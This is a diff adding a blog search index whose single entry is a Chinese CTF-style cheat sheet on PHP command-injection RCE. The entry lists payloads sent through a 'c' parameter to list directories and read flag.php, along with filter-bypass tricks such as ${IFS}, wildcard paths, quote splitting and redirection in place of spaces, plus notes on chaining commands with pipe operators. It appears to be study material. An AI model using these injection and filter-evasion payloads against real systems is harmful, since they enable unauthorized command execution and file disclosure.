@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>Rce</title>
+    <link href="/2024/01/25/Rce/"/>
+    <url>/2024/01/25/Rce/</url>
+    
+    <content type="html"><![CDATA[<p>1、查看根目录内容<br>c&#x3D;var_dump(scandir(‘&#x2F;‘));或者c&#x3D;var_export(scandir(‘&#x2F;‘));或者c&#x3D;print_r(scandir(“&#x2F;“));或者system(‘ls &#x2F;‘);或者echo <code>ls /</code>;<br>2、查看文件内容<br>highlight_file(“flag.php”);或者include(“flag.txt”);或者require(‘flag.php’);或者system(‘tac(cat) &#x2F;‘);或者echo <code>tac(cat) /</code>;</p><p>文件重命名：<br>如过滤了很多命令可以尝试使用文件重命名：<br>例：<br>?c&#x3D;mv${IFS}fl??.???${IFS}a.txt<br>把flag.php重命名为了a.txt<br>然后直接访问a.txt就行了</p><p>过滤掉字母没过滤掉数字：<br>?c&#x3D;&#x2F;???&#x2F;????64 ????.???<br>意思为：?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>?c&#x3D;nl&lt;fla’’g.php<br>nl：查看源码；<br>&lt;，&lt;&gt;：代替空格(不能搭配通配符)<br>c&#x3D;tac&lt;&gt;fla’’g.php||<br>c&#x3D;tac&lt;fla’’g.php||</p><p>管道符:<br>1、|（就是按位或），直接执行|后面的语句</p><p>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p><p>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</p><p>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p><p>5、;（&amp;一样的作用）在linux下用</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
